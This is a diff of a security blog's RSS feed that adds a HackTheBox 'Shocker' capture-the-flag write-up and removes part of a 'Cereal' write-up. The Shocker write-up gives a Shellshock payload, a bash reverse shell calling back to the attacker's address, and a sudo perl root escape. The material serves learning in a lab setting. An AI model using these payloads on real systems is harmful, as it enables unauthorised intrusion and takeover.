@@ -7,6 +7,246 @@
     <generator>Hugo -- gohugo.io</generator>
     <lastBuildDate>Wed, 19 May 2021 01:32:22 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/writeups/hackthebox/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>HackTheBox - Shocker</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-shocker/</link>
+      <pubDate>Tue, 13 Jul 2021 11:30:31 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-shocker/</guid>
+      <description>Shellshock is an easy Linux machines from HackTheBox that introduces a vulnerability called Shellshock (CVE-2014-6271). Exploiting this vulnerability results in an unauthenticated remote code execution, which is leveraged to gain a foothold in the system. There is a sudo privilege on perl , and this can leveraged as well to gain root shell.
+In the end of this write-up, I&amp;rsquo;ll see how the Shellshock vulnerability works.
+Skills Learned  Exploitation of Shellshock vulnerability Exploitation of sudo privileges on perl  Tools  Nmap Burp Suite Gobuster  Reconnaissance A full TCP scan discovers two open ports: an Apache web server on port 80 and SSH on port 2222.</description>
+      <content:encoded><![CDATA[<p>Shellshock is an easy Linux machines from HackTheBox that introduces a vulnerability called Shellshock (CVE-2014-6271). Exploiting this vulnerability results in an unauthenticated remote code execution, which is leveraged to gain a foothold in the system. There is a sudo privilege on <code>perl</code> , and this can leveraged as well to gain root shell.</p>
+<p>In the end of this write-up, I&rsquo;ll see how the Shellshock vulnerability works.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>Exploitation of Shellshock vulnerability</li>
+<li>Exploitation of sudo privileges on perl</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Nmap</li>
+<li>Burp Suite</li>
+<li>Gobuster</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p>A full TCP scan discovers two open ports: an Apache web server on port 80 and SSH on port 2222.</p>
+<h3 id="nmap">Nmap</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
+$ nmap -p- -sV -oA nmap/10-tcp-allport-shocker 10.10.10.56 
+Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-07-10 20:24 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.56
+Host is up <span style="color:#f92672">(</span>0.065s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65533</span> closed ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 98.00 seconds
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>The site serves only one a text and an image.</p>
+<p><img class="img-container" src="imgs/image-20210711072532615.png" alt="image-20210711072532615"  />
+</p>
+<p>The server response contains uncommon Header called <code>Accept-Ranges</code>. According to <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Range_requests#requesting_a_specific_range_from_a_server">MDN</a>, this header is allows us to control the portion of the HTTP message.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
+$ curl -I http://10.10.10.56
+HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+Date: Sun, <span style="color:#ae81ff">11</span> Jul <span style="color:#ae81ff">2021</span> 00:49:51 GMT
+Server: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+Last-Modified: Fri, <span style="color:#ae81ff">22</span> Sep <span style="color:#ae81ff">2017</span> 20:01:19 GMT
+ETag: <span style="color:#e6db74">&#34;89-559ccac257884&#34;</span>
+Accept-Ranges: bytes
+Content-Length: <span style="color:#ae81ff">137</span>
+Vary: Accept-Encoding
+Content-Type: text/html
+</code></pre></div><p>A <a href="https://www.rapid7.com/db/modules/auxiliary/dos/http/apache_range_dos/">quick search</a> on google finds that it can be used for DDoS attack.</p>
+<h4 id="gobuster">Gobuster</h4>
+<p>A <code>gobuster</code> scan finds two directories:  <code>/cgi-bin/</code> and <code>/icons</code></p>
+<pre><code>→ kali@kali «shocker» «10.10.14.83» 
+$ gobuster dir -u http://10.10.10.56/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/gobuster-S-80 -f         
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.56/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Add Slash:               true
+[+] Timeout:                 10s
+===============================================================
+2021/07/10 20:26:07 Starting gobuster in directory enumeration mode
+===============================================================
+/cgi-bin/             (Status: 403) [Size: 294]
+/icons/               (Status: 403) [Size: 292]
+...[SNIP]...
+</code></pre><p>Another scan on <code>/cgi-bin/</code> discovers a file called <code>users.sh</code></p>
+<pre><code>→ kali@kali «shocker» «10.10.14.83» 
+$ gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/gobuster-cgi-bin -f -x cgi,sh
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.56/cgi-bin
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              cgi,sh
+[+] Add Slash:               true
+[+] Timeout:                 10s
+===============================================================
+2021/07/10 21:43:04 Starting gobuster in directory enumeration mode
+===============================================================
+/user.sh              (Status: 200) [Size: 125]
+...[SNIP]...
+</code></pre><p>The <code>script.sh</code> returns the following contents.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
+$ curl -s http://10.10.10.56/cgi-bin/user.sh
+Content-Type: text/plain
+
+Just an uptime test script
+
+ 21:46:09 up <span style="color:#ae81ff">1</span> day, 20:28,  <span style="color:#ae81ff">0</span> users,  load average: 0.00, 0.01, 0.00
+
+</code></pre></div><p>According to the box name and a <code>/cgi-bin/</code> folder which contains a bash script, it&rsquo;s going to be shellshock vulnerability.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-shelly">Shell as shelly</h3>
+<h4 id="shellshock-cve-2014-6271">Shellshock (CVE-2014-6271)</h4>
+<p>The Shellshock vulnerability is well explained in this <a href="https://pentesterlab.com/exercises/cve-2014-6271/course">free course</a> by PentesterLab.</p>
+<p>The following is the commonly used PoC for shellshock.</p>
+<pre><code>(){:}; echo; &lt;bash command&gt;
+</code></pre><p>The PoC works on <code>User-Agent</code> header.</p>
+<p><img class="img-container" src="imgs/image-20210711090447537-1626151933213.png" alt="image-20210711090447537"  />
+</p>
+<p>It also works on the  <code>Accept</code> header (I&rsquo;m shocked now 😄).</p>
+<p><img class="img-container" src="imgs/image-20210711085942731.png" alt="image-20210711085942731"  />
+</p>
+<h4 id="reverse-shell">Reverse Shell</h4>
+<p>I tried to get a shell but somehow it didn&rsquo;t connect back, but then I figured out why after redirecting stderr to stderr, it wanted a full path!</p>
+<p><img class="img-container" src="imgs/image-20210711091930431.png" alt="image-20210711091930431"  />
+</p>
+<p>The installed <code>nc</code> doesn&rsquo;t have <code>-e</code>.</p>
+<p><img class="img-container" src="imgs/image-20210711092401328.png" alt="image-20210711092401328"  />
+</p>
+<p>The following bash reverse shell works.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">()</span> <span style="color:#f92672">{</span> :;<span style="color:#f92672">}</span>; echo; echo <span style="color:#e6db74">&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.83/53 0&gt;&amp;1&#34;</span> | /bin/bash
+</code></pre></div><p><img class="img-container" src="imgs/image-20210711093314357.png" alt="image-20210711093314357"  />
+</p>
+<h4 id="shell-upgrade">Shell Upgrade</h4>
+<p>I&rsquo;ll upgrade my shell using the PTY trick (that&rsquo;s how I called it).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">shelly@Shocker:/usr/lib/cgi-bin$ export TERM<span style="color:#f92672">=</span>xterm
+export TERM<span style="color:#f92672">=</span>xterm
+shelly@Shocker:/usr/lib/cgi-bin$ script /dev/null -c bash                    
+script /dev/null -c bash
+Script started, file is /dev/null
+shelly@Shocker:/usr/lib/cgi-bin$ ^Z
+<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">7339</span> suspended  nc -nvlp <span style="color:#ae81ff">53</span>
+→ kali@kali «shocker» «10.10.14.83» 
+$ stty raw -echo; fg
+<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">7339</span> continued  nc -nvlp <span style="color:#ae81ff">53</span>
+
+shelly@Shocker:/usr/lib/cgi-bin$  
+</code></pre></div><p>The user flag is done here.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">shelly@Shocker:/home/shelly$ ls -l 
+total <span style="color:#ae81ff">8</span>
+drwxr-xr-x <span style="color:#ae81ff">2</span> shelly shelly <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">10</span> 03:31 test
+-r--r--r-- <span style="color:#ae81ff">1</span> root   root     <span style="color:#ae81ff">33</span> Jul  <span style="color:#ae81ff">9</span> 01:17 user.txt
+shelly@Shocker:/home/shelly$ cat user.txt 
+7ac9eb73e6cb...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="internal-enumeration">Internal Enumeration</h4>
+<p>A quick check on sudo privileges reveals that user <code>shelly</code> can run <code>perl</code> with <code>sudo</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
+sudo -l
+Matching Defaults entries <span style="color:#66d9ef">for</span> shelly on Shocker:
+    env_reset, mail_badpass,
+    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+
+User shelly may run the following commands on Shocker:
+    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/perl
+</code></pre></div><h4 id="sudo---perl">Sudo - perl</h4>
+<p>Using <a href="https://gtfobins.github.io/gtfobins/perl/#sudo">GTFOBins</a> as reference, I&rsquo;m now root.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">shelly@Shocker:/home/shelly$ sudo -u root perl -e <span style="color:#e6db74">&#39;exec &#34;/bin/bash&#34;;&#39;</span>
+root@Shocker:/home/shelly# id <span style="color:#f92672">&amp;&amp;</span> hostname
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+Shocker
+root@Shocker:/home/shelly#
+</code></pre></div><p>The root flag.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@Shocker:~# cat root.txt
+e3689b13acb2...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+</code></pre></div><h2 id="extras">Extras</h2>
+<p>Since this vulnerability is interesting yet dangerous, I&rsquo;d like to observe how it works.</p>
+<h3 id="playing-a-bit-with-shellshock">Playing a bit with Shellshock</h3>
+<p>I did a quick test using the following script which placed under /<code>cgi-bin/</code> folder. The script will prints all the environment variables.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@Shocker:/usr/lib/cgi-bin# echo -e <span style="color:#e6db74">&#39;#!/bin/bash\necho test\nenv&#39;</span> &gt; iamf.sh
+root@Shocker:/usr/lib/cgi-bin# chmod +x iamf.sh 
+</code></pre></div><p>And now I could understand why it is so dangerous. It even exports my custom header and turns it into an environment variable.</p>
+<p><img class="img-container" src="imgs/image-20210711100705447.png" alt="image-20210711100705447"  />
+</p>
+<p>The full response</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">HTTP/1.1 200 OK
+Date: Sun, 11 Jul 2021 03:06:31 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Connection: close
+Content-Type: text/x-sh
+Content-Length: 1113
+
+iamf
+test
+SERVER_SIGNATURE=&lt;address&gt;Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80&lt;/address&gt;
+
+HTTP_USER_AGENT=Blackhole
+SERVER_PORT=80
+HTTP_HOST=10.10.10.56
+DOCUMENT_ROOT=/var/www/html
+SCRIPT_FILENAME=/usr/lib/cgi-bin/iamf.sh
+REQUEST_URI=/cgi-bin/iamf.sh
+SCRIPT_NAME=/cgi-bin/iamf.sh
+HTTP_CONNECTION=close
+REMOTE_PORT=58222
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+HTTP_IF_NONE_MATCH=&#34;89-559ccac257884-gzip&#34;
+CONTEXT_PREFIX=/cgi-bin/
+PWD=/usr/lib/cgi-bin
+SERVER_ADMIN=webmaster@localhost
+REQUEST_SCHEME=http
+HTTP_IF_MODIFIED_SINCE=Fri, 22 Sep 2017 20:01:19 GMT
+HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
+HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+REMOTE_ADDR=10.10.14.83
+SHLVL=1
+SERVER_NAME=10.10.10.56
+CONTENT_LENGTH=0
+SERVER_SOFTWARE=Apache/2.4.18 (Ubuntu)
+QUERY_STRING=
+SERVER_ADDR=10.10.10.56
+GATEWAY_INTERFACE=CGI/1.1
+HTTP_UPGRADE_INSECURE_REQUESTS=1
+SERVER_PROTOCOL=HTTP/1.1
+HTTP_CACHE_CONTROL=max-age=0
+HTTP_ACCEPT_ENCODING=gzip, deflate
+REQUEST_METHOD=GET
+CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
+HTTP_IAMF_HEADER=() {  :
+}
+_=/usr/bin/env
+</code></pre></div><hr>
+<h2 id="references">Reference(s)</h2>
+<ul>
+<li><a href="https://pentesterlab.com/exercises/cve-2014-6271/course">https://pentesterlab.com/exercises/cve-2014-6271/course</a></li>
+<li><a href="https://gtfobins.github.io/gtfobins/perl/#sudo">https://gtfobins.github.io/gtfobins/perl/#sudo</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
       <title>HackTheBox - Atom</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-atom/</link>
       <pubDate>Sat, 10 Jul 2021 20:28:32 +0700</pubDate>
@@ -1515,584 +1755,6 @@ bf7edd4c58e4420
 <li><a href="https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/">https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/</a></li>
 <li><a href="https://discuss.getsol.us/d/4656-java-command-unknown-after-update/3">https://discuss.getsol.us/d/4656-java-command-unknown-after-update/3</a></li>
 <li><a href="http://www.citrucoop.es/jdk-11.0.6/bin/">http://www.citrucoop.es/jdk-11.0.6/bin/</a></li>
-</ul>
-]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>HackTheBox - Cereal (User only)</title>
-      <link>https://fahmifj.github.io/writeups/hackthebox/htb-cereal/</link>
-      <pubDate>Wed, 09 Jun 2021 07:33:40 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-cereal/</guid>
-      <description>Doing code reviews in order to chain XSS, SSRF, and Deserialization vulnerabilities to gain a foothold</description>
-      <content:encoded><![CDATA[<p>Cereal is a hard difficulty Windows machine that features a misconfigured web server, which exposes source code of the currently hosted web application. Initial source code analysis revealed a deleted JWT secret that could be used to forge a JWT token and bypass the application&rsquo;s login page. Another code analysis finds the web is vulnerable to a deserialization attack. There is also an XSS vulnerability in one of the packages used by the application. Chaining these vulnerabilities allows me to gain a foothold in the system.</p>
-<h3 id="skills-learned">Skills Learned</h3>
-<ul>
-<li>Code review</li>
-<li>JWT authentication bypass</li>
-<li>XSS exploitation</li>
-<li>.NET deserialization</li>
-</ul>
-<h3 id="tools">Tools</h3>
-<ul>
-<li>Kali Linux 2019.4 (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
-<li>Nmap - Preinstalled in Kali Linux</li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p>All TCP ports scan with <code>nmap</code> discovers three open ports: SSH on port 22, HTTP on port 80, and HTTP on port 443.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
-$ nmap -p- --min-rate <span style="color:#ae81ff">1000</span> --reason -oA nmap/10-tcp-allport-cereal 10.10.10.217
-Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-06-04 23:45 EDT
-
-...&lt;SNIP&gt;...
-PORT    STATE SERVICE REASON
-22/tcp  open  ssh     syn-ack ttl <span style="color:#ae81ff">127</span>
-80/tcp  open  http    syn-ack ttl <span style="color:#ae81ff">127</span>
-443/tcp open  https   syn-ack ttl <span style="color:#ae81ff">127</span>
-
-Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 118.08 seconds
-</code></pre></div><p>I&rsquo;ll run another scan with <code>nmap</code> &rsquo;s default scripts.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
-$ nmap -p 22,80,443 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.217
-Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-06-04 23:51 EDT
-
-...&lt;SNIP&gt;...
-PORT    STATE SERVICE  VERSION
-22/tcp  open  ssh      OpenSSH for_Windows_7.7 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
-| ssh-hostkey: 
-|   <span style="color:#ae81ff">2048</span> 08:8e:fe:04:8c:ad:6f:df:88:c7:f3:9a:c5:da:6d:ac <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
-|   <span style="color:#ae81ff">256</span> fb:f5:7b:a1:68:07:c0:7b:73:d2:ad:33:df:0a:fc:ac <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
-|_  <span style="color:#ae81ff">256</span> cc:0e:70:ec:33:42:59:78:31:c0:4e:c2:a5:c9:0e:1e <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
-80/tcp  open  http     Microsoft IIS httpd 10.0
-|_http-server-header: Microsoft-IIS/10.0
-|_http-title: Did not follow redirect to https://cereal.htb/
-|_https-redirect: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
-443/tcp open  ssl/http Microsoft IIS httpd 10.0
-|_http-server-header: Microsoft-IIS/10.0
-|_http-title: Cereal
-| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>cereal.htb
-| Subject Alternative Name: DNS:cereal.htb, DNS:source.cereal.htb
-| Not valid before: 2020-11-11T19:57:18
-|_Not valid after:  2040-11-11T20:07:19
-|_ssl-date: 2021-06-05T03:51:48+00:00; +5s from scanner time.
-| tls-alpn: 
-|_  http/1.1
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-|_clock-skew: 4s
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 23.34 seconds
-</code></pre></div><p>This time <code>nmap</code> found two hostnames from the SSL certificate: <code>cereal.htb</code> and <code>source.cereal.htb</code>.</p>
-<p>I&rsquo;ll add those hostnames to my <code>/etc/hosts</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
-$ echo <span style="color:#e6db74">&#39;10.10.10.217 cereal.htb source.cereal.htb&#39;</span> &gt;&gt; /etc/hosts
-</code></pre></div><h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-80">TCP 80</h3>
-<p>It redirects to the HTTPS.</p>
-<h3 id="tcp-443---cerealhtb">TCP 443 - cereal.htb</h3>
-<p>Following the redirection ends up at a login form.</p>
-<p><img class="img-container" src="imgs/image-20210605110703967.png" alt="image-20210605110703967"  />
-</p>
-<p>I tried a few common credentials but doesn&rsquo;t seem to work here.</p>
-<p>Inspecting the source reveals that this site is a react based application.</p>
-<p><img class="img-container" src="imgs/image-20210609080804206.png" alt="image-20210609080804206"  />
-</p>
-<p>If I track down the authentication process, this site store the authentication data in browser&rsquo;s local storage with a key name of <code>currentUser</code>.</p>
-<p><img class="img-container" src="imgs/image-20210609082429730.png" alt="image-20210609082429730"  />
-</p>
-<p>But l&rsquo;ll leave it for now.</p>
-<p>I also did a gobuster scan, but didn&rsquo;t find anything useful.</p>
-<h3 id="tcp-443---sourcecerealhtb">TCP 443 - source.cereal.htb</h3>
-<p>Visiting <code>source.cereal.htb</code> shows a server error message of an ASP.net application:</p>
-<p><img class="img-container" src="imgs/image-20210605111410148.png" alt="image-20210605111410148"  />
-</p>
-<p>Nothing I can do with this page, but I&rsquo;ll take note on the leaked file path:</p>
-<ul>
-<li><code>C:\inetpub\source\default.aspx</code></li>
-</ul>
-<h4 id="gobuster">Gobuster</h4>
-<p><code>gobuster</code> scan discovers a git repository, and there is also an upload directory.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
-$ gobuster dir -u https://source.cereal.htb -k -w /opt/SecLists/Discovery/Web-Content/common.txt -x aspx,txt
-<span style="color:#f92672">===============================================================</span>
-Gobuster v3.1.0
-by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
-<span style="color:#f92672">===============================================================</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     https://source.cereal.htb
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              aspx,txt
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
-<span style="color:#f92672">===============================================================</span>
-2021/06/05 00:52:32 Starting gobuster in directory enumeration mode
-<span style="color:#f92672">===============================================================</span>
-/.git/HEAD            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 23<span style="color:#f92672">]</span>
-/Default.aspx         <span style="color:#f92672">(</span>Status: 500<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 10090<span style="color:#f92672">]</span>
-/aspnet_client        <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 163<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://source.cereal.htb/aspnet_client/<span style="color:#f92672">]</span>
-/default.aspx         <span style="color:#f92672">(</span>Status: 500<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 9727<span style="color:#f92672">]</span>                                              
-/uploads              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 157<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://source.cereal.htb/uploads/<span style="color:#f92672">]</span>      
-                                                                                              
-<span style="color:#f92672">===============================================================</span>
-2021/06/05 00:54:41 Finished
-<span style="color:#f92672">===============================================================</span>
-</code></pre></div><p>Access to the <code>.git</code> and the <code>uploads</code> directory are forbidden.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
-$ curl -I -k http://source.cereal.htb/.git/ <span style="color:#f92672">&amp;&amp;</span> curl -I -k http://source.cereal.htb/uploads/
-HTTP/1.1 <span style="color:#ae81ff">403</span> Forbidden
-Content-Length: <span style="color:#ae81ff">1233</span>
-Content-Type: text/html
-Server: Microsoft-IIS/10.0
-X-Powered-By: Sugar
-Date: Sat, <span style="color:#ae81ff">05</span> Jun <span style="color:#ae81ff">2021</span> 05:01:25 GMT
-
-HTTP/1.1 <span style="color:#ae81ff">403</span> Forbidden
-Content-Length: <span style="color:#ae81ff">1233</span>
-Content-Type: text/html
-Server: Microsoft-IIS/10.0
-X-Powered-By: Sugar
-Date: Sat, <span style="color:#ae81ff">05</span> Jun <span style="color:#ae81ff">2021</span> 05:08:16 GMT
-</code></pre></div><p>But requesting files under <code>.git</code> directory are allowed.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
-$ curl -I -k http://source.cereal.htb/.git/HEAD
-HTTP/1.1 <span style="color:#ae81ff">200</span> OK
-Content-Length: <span style="color:#ae81ff">23</span>
-Content-Type: text/plain
-Last-Modified: Wed, <span style="color:#ae81ff">11</span> Nov <span style="color:#ae81ff">2020</span> 20:09:34 GMT
-Accept-Ranges: bytes
-ETag: <span style="color:#e6db74">&#34;adc1d19266b8d61:0&#34;</span>
-Server: Microsoft-IIS/10.0
-X-Powered-By: Sugar
-Date: Sat, <span style="color:#ae81ff">05</span> Jun <span style="color:#ae81ff">2021</span> 05:01:29 GMT
-
-→ root@kali «cereal» «10.10.14.3» 
-$ curl -s -k http://source.cereal.htb/.git/HEAD
-ref: refs/heads/master
-</code></pre></div><p>I&rsquo;ll note the <code>uploads</code> directory</p>
-<h3 id="git">Git</h3>
-<h4 id="dumping-git-directory">Dumping .git directory</h4>
-<p>With <a href="https://github.com/arthaud/git-dumper">git-dumper</a>, I could get all the files in that <code>.git</code> directory.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
-$ mkdir loot/source-cereal-git <span style="color:#f92672">&amp;&amp;</span> ./git-dumper.py https://source.cereal.htb/.git loot/source-cereal-git 
-<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Testing https://source.cereal.htb/.git/HEAD <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
